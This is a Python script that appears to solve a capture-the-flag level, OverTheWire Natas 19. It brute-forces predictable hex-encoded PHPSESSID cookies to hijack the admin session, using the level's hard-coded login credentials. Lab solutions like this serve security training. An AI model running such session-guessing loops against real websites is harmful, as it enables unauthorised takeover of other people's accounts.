#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

import requests
import re

username = 'natas19'
password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'

url = 'http://%s.natas.labs.overthewire.org/' %username
session = requests.Session()
for i in range (641):
    print('"PHPSESSID" : '+str("%d-admin" %i).encode("utf-8").hex())
    response = session.get(url, cookies = {"PHPSESSID" : str("%d-admin"% i).encode("utf-8").hex()}, auth = (username, password))

    if ("You are an admin." in response.text):
        print(response.text)
        break
